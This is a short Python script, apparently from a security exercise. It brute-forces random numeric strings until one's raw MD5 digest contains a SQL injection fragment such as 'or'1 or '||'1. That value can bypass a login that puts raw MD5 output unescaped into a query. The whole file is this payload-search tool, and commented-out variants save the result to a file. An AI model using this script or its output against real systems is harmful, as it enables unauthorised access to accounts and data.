import random
import re
from pymd5 import md5

# for i in range(99999979349253, 0, -1):
while True:
    i = "".join([str(random.randint(0, 9)) for x in range(40)])
    md = md5()
    md.update(str(i))
    dig = str(md.digest())
    
    if re.search("'(or|OR|oR|Or|\|\|)'[1-9]", dig) is not None:
        print(i)
        print(md.digest())
        break
    # ans_index = dig.find('\'||\'1')
    # if ans_index >= 0:
    #     print(i)
    #     print(md.digest())
    #     file = open("working-val.txt", "x")
    #     file.write(i + "\n" + md.digest())
    #     break
    # bar_index = dig.find('\'||\'')
    
    # or_index = dig.find('\'or\'')
    # index = max(bar_index, or_index)
    # if index >= 0 and len(dig) > (index+4) and (dig[index+4]).isdigit() and (dig[index+4]) != '0':
    #     print(i)
    #     print(md.digest())
    #     file = open("working-val.txt", "x")
    #     file.write(i + "\n" + md.digest())
    #     break